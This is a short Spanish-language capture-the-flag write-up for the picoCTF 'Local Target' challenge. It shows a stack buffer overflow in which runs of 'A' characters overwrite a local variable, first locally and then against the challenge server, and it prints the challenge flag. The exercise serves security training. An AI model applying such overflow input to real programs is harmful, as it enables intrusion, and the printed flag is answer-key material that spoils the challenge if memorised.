# Local Target

# Objetivo
Smash the stack Can you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/517/local-target). You can view source [here](https://artifacts.picoctf.net/c/517/local-target.c). And connect with it using: `nc saturn.picoctf.net 53496`

# Pistas
- Do anything you can to change `num`.
- When you change `num`, view the value as hexadecimal.

# Solución
- Descargamos el codigo y el programa
- Inspeccionamos el coodigo
- Podemos modificar la variable num sobrepasando el buffer y asi cambiando el valor de num
- Al ingresar puras "A" se puede obtener ya que el tipo de dato es chr
```
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/local]
└─$ ./local-target   
Enter a string: AAAAAAAAAAAAAAAAAAAAAAA

num is 64
Bye!
                                                                                  
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/local]
└─$ ./local-target
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAA

num is 0
Bye!
                                                                                  
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/local]
└─$ ./local-target
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
Cannot open file.
                                                                                  
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/local]
└─$ nc saturn.picoctf.net 53496                            
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
                                                                                  
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/local]
└─$ 

```

# Bandera
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}

## Notas adicionales
| comando | descripción |
| ------ | ------ |
| xx | xx |

## Referencias
- []()